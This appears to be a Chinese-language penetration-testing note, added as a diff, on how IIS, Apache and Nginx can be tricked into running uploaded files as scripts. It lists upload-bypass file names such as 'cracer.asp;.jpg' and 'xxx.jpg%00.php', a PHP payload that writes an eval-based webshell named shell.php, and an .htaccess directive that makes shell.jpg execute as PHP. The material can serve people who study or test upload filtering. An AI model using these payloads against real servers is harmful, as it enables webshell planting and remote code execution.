@@ -1,0 +1,47 @@
+特殊文件被iis、apache、nginx在某种情况下解释成脚本文件格式的漏洞
+
+一、iis5.x/6.0解析漏洞
+1.目录解析
+/xx.asp/xx.jpg
+
+在网站下建立文件夹的名字为.asp、.asa的文件夹，其目录内所有扩展
+的文件都被iis当作asp文件解析并执行。
+
+2.文件解析
+cracer.asp;.jpg
+上传时识别后缀.jpg会被认为是.jpg文件而允许被上传
+在准备执行时，
+分号后面的不被解析，上述会被服务器看成是cracer.asp而执行
+iis6.0默认的可执行文件除了asp还有：
+/cracer.asa
+/cracer.cer
+/cracer.cdx
+
+二、Apache解析漏洞
+从右到左开始判断解析，如不可识别，就再往左判断
+比如cr.php.owf.rar，其中.owf和.rar不可被apache识别
+，就会把cr.php.owf.rar这个文件解析成php。
+
+
+三、iis7.0、iis7.5、Nginx <8.03畸形解析漏洞
+Fast-CGI开启时，上传一个cr.jpg，内容为
+<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
+的文件，然后访问cr.jpg/.php，在这个目录下就会生成一句话木马shell.php
+www.xxx.com/logo.gif/*.php触发漏洞（有漏洞会把前面文件当作php执行）
+
+
+四、Nginx< 8.03空字节代码执行漏洞
+影响版本：0.5.、0.6.、0.7<=0.7.65,0.8<=0.8.37
+Nginx在图片中嵌入PHP代码然后通过访问
+xxx.jpg%00.php
+来执行其中代码
+
+五、htaccess文件解析
+<FilesMatch "shell.jpg"> SetHandler application/x-httpd-php</FilesMatch>
+
+
+
+
+
+
+
